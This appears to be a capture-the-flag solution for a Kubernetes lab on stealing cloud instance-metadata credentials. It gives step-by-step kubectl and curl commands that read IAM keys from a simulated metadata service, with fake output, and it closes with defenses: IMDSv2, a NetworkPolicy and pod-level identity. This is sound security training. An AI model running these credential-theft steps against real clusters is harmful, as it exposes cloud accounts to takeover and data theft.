# IMDS Credential Theft — Solution

## The Attack

The flag is in the `SecretAccessKey` field of the IMDS IAM credential response.

### Step 1: Get a shell inside the attacker foothold pod

```bash
kubectl exec -it attacker-foothold -n dojo-sec-imds -- sh
```

### Step 2: Probe the IMDS root endpoint

```bash
curl http://fake-imds-svc/latest/meta-data/
```

Output:
```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
instance-type
local-ipv4
placement/
public-ipv4
```

The `iam/` path is what you want — it leads to the credentials.

### Step 3: Discover available IAM roles

```bash
curl http://fake-imds-svc/latest/meta-data/iam/security-credentials/
```

Output:
```
node-role
```

### Step 4: Retrieve the full credentials for the node role

```bash
curl http://fake-imds-svc/latest/meta-data/iam/security-credentials/node-role
```

Output:
```json
{
  "Code": "Success",
  "LastUpdated": "2026-11-25T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAREDTEAM1337DOJO",
  "SecretAccessKey": "KUBE{imds_creds_live_on_169_254_169_254}",
  "Token": "FakeSTS//////////SimulatedSessionToken==",
  "Expiration": "2026-11-25T06:00:00Z"
}
```

**Flag:** `KUBE{imds_creds_live_on_169_254_169_254}`

---

## Why This Works in the Real World

On AWS without IMDS v2 enforcement, every pod on an EKS node can:

1. Reach `169.254.169.254` (unless a NetworkPolicy blocks it)
2. Call the metadata API with a simple `curl` — no credentials required
3. Retrieve the node's IAM role credentials — `AccessKeyId`, `SecretAccessKey`, `Token`
4. Use those credentials with the AWS CLI or SDK to access cloud resources

The node's IAM role often has permissions like `ec2:Describe*`, `s3:GetObject`, and sometimes `eks:DescribeCluster` — enough to pivot to data exfiltration or further cluster compromise.

---

## Defenses

### 1. Enforce IMDSv2 (Hop-by-Hop Token Required)

IMDSv2 requires a PUT request to get a session token *before* any GET requests work. The token has a TTL and a max-hop-count. You can enforce it at the EC2 launch configuration:

```bash
# AWS CLI: enforce IMDSv2 on existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-put-response-hop-limit 1

# EKS node group: set in launch template
# MetadataOptions:
#   HttpTokens: required
#   HttpPutResponseHopLimit: 1
```

The hop limit of `1` means the token cannot be forwarded (a container would need hop-limit=2 to reach the host's IMDS — set to 1 means only the host itself can use it).

### 2. NetworkPolicy — Block 169.254.169.254

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-imds
  namespace: production
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
```

### 3. Use IAM Roles for Service Accounts (IRSA) / Workload Identity

Instead of relying on node-level IAM roles (which every pod on that node can steal), use pod-level identity:

- **AWS:** IRSA — annotate the ServiceAccount with an IAM role ARN, only pods using that SA get those permissions
- **GCP:** Workload Identity Federation
- **Azure:** Azure AD Workload Identity

This way, a compromised pod can only access the IAM permissions explicitly granted to its ServiceAccount — not the node's broad permissions.
